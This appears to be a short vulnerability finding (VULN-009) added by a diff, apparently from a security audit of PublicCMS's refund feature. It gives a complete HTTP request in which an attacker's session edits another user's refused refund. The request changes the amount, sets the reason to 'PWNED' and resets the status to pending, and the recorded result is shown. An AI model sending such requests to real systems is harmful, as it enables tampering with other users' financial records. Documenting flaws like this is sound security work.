@@ -1,0 +1,11 @@
+### VULN-009 — cross-user edit of a REFUSE refund (operator-precedence bug)
+### Precondition (seeded, no gateway): PAID payment P + victim-owned REFUSE refund R (payment_id=P).
+POST /tradePayment/refund HTTP/1.1
+Host: site2.dev.publiccms.com
+Cookie: PUBLICCMS_USER=<attacker-id>_<token>
+Content-Type: application/x-www-form-urlencoded
+
+_csrf=<token>&id=<victim-refund-id>&paymentId=<P>&amount=999.00&reason=PWNED&returnUrl=/
+
+### -> 302; victim's refund: amount->999, reason->PWNED, status 3(REFUSE)->0(PENDING), owner unchanged
+### (nonexistent id + PAID paymentId -> HTTP 404 abnormal termination; NPE is code-present)
